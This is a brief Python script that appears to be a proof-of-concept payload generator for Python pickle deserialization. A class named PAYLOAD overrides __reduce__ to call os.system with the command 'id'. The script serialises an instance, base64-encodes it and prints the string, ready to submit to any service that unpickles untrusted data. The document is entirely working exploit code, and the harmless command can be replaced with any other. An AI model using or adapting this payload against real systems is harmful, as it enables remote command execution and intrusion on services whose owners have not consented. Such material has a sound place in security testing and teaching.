import pickle,base64,os
class PAYLOAD():
	def __reduce__(self):
		cmd = "id"
		return os.system, (cmd,)	
output = base64.b64encode(pickle.dumps(PAYLOAD(), protocol=0)).decode("utf-8")
print(output)

